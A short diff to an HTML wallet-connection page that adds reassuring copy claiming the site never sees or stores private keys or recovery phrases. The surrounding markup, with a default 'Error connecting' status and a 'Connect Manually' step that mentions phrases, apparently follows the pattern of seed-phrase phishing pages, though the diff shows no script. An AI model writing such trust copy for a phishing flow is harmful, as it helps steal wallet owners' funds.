@@ -55,6 +55,7 @@
 
         <!-- Page 2: Wallet Selection -->
         <section id="connect-wallet" class="page">
+            <h2>Choose your wallet above and authorize the connection to enjoy seamless transactions</h2>
             <h1>Connect Your Wallet</h1>
             <select id="walletSelect">
                 <option value="" data-logo="/public/default.png" disabled selected>Select Wallet</option>
@@ -70,10 +71,12 @@
                 <option value="other" data-logo="/public/other.png">Other Wallet</option>
             </select>
             <button id="connectButton">Connect</button>
+            <p>Select your wallet type from the menu, or choose ‘Other Wallet’ to continue</p>
         </section>
 
         <!-- Page 3: Connection Result -->
         <section id="connect-result" class="page">
+            <h2>Your wallet, your control — we never see or store your private keys</h2>
             <h1>Connection Status</h1>
             <p id="connectionMessage">Error connecting</p>
             <button id="connectManuallyButton">Connect Manually</button>
@@ -86,6 +89,7 @@
                 <p id="statusMessage"></p>
                 <div id="barcodeContainer" class="hidden"></div>
             </div>
+            <p>Your phrases remain fully under your control — we never store or access them</p>
         </section>
     </main>
     <footer id="contact">
